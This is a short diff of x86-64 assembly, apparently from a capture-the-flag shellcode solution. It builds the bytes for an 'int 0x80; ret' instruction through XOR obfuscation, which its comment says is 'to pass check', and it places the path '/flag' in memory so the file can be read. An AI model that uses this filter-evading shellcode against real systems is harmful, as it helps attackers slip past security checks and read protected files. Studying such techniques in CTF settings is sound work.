@@ -18,17 +18,12 @@ _code64:
     ; obfuscate int 0x80; ret bytes to pass check
     mov ax, 0xc18c
     xor ax, 0x4141
-    ;mov [_sys32], ax
     mov rdx, _sys32
     mov [rdx], ax
 
     mov rax, '/flag'
     mov rdx, flag_addr
     mov qword [rdx], rax
-    ;mov esi, fname
-    ;mov rdi, flag_addr
-    ;mov ecx, 5
-    ;rep movsb
 
     mov rdi, flag_addr
     xor rsi, rsi
